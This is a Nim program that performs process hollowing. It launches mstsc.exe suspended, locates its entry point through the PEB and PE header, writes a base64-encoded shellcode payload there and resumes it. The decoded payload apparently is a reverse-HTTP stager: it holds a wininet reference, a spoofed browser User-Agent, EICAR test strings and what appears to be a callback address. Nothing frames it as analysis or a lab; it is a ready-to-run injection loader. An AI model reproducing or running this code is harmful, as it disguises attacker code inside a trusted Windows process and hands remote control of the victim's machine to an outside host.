import base64
import endians
import dynlib

import winim
import winim/lean

type
  PROCESSINFOCLASS {. pure .} = enum
    ProcessBasicInformation = 0

proc ZwQueryInformationProcess(
  ProcessHandle: HANDLE,
  ProcessInformationClass: PROCESSINFOCLASS,
  ProcessInformation: PVOID,
  ProcessInformationLength: ULONG,
  ReturnLength: PULONG):
  NTSTATUS
  {.stdcall, dynlib: "ntdll", importc: "ZwQueryInformationProcess".}

proc hollowing[byte](shellcode: openArray[byte]): void =
  let
      processImage: string = r"C:\Windows\System32\mstsc.exe"
  var
      nBytes: SIZE_T
      tmp: ULONG
      res: WINBOOL
      baseAddressBytes: array[0..sizeof(PVOID), byte]
      data: array[0..0x200, byte]

  var ps: SECURITY_ATTRIBUTES
  var ts: SECURITY_ATTRIBUTES
  var si: STARTUPINFOEX
  var pi: PROCESS_INFORMATION

  res = CreateProcess(NULL, newWideCString(processImage), ps, ts, FALSE, CREATE_SUSPENDED, NULL, NULL, addr si.StartupInfo, addr pi)
  
  var pHandle = pi.pHandle
  var bi: PROCESS_BASIC_INFORMATION

  ZwQueryInformationProcess(pHandle, PROCESSINFOCLASS.ProcessBasicInformation, addr bi, cast[ULONG](sizeof(bi)), addr tmp)

  let ptrToImageBase = cast[PVOID](cast[int64](bi.PebBaseAddress) + 0x10);
  ReadProcessMemory(pHandle, ptrToImageBase, addr baseAddressBytes, sizeof(PVOID), addr nBytes);

  let imageBaseAddress = cast[PVOID](cast[int64](baseAddressBytes))
  ReadProcessMemory(pHandle, imageBaseAddress, addr data, len(data), addr nBytes);

  var e_lfanew: uint
  littleEndian32(addr e_lfanew, addr data[0x3c])

  var entrypointRvaOffset = e_lfanew + 0x28
  var entrypointRva: uint
  littleEndian32(addr entrypointRva, addr data[cast[int](entrypointRvaOffset)])

  var entrypointAddress = cast[PVOID](cast[uint64](imageBaseAddress) + entrypointRva)
  WriteProcessMemory(pHandle, entrypointAddress, unsafeAddr shellcode, len(shellcode), addr nBytes);
  ResumeThread(pi.hThread);

when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8vdlBMSwA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IC5ORVQgQ0xSIDIuMC41MDcyNzsgLk5FVCBDTFIgMy4wLjA0NTA2LjMwKQ0KADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSQBBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTQ1AAAAAAA=" 

  let shellcode = toByteSeq(decode(enc))
  hollowing(shellcode)
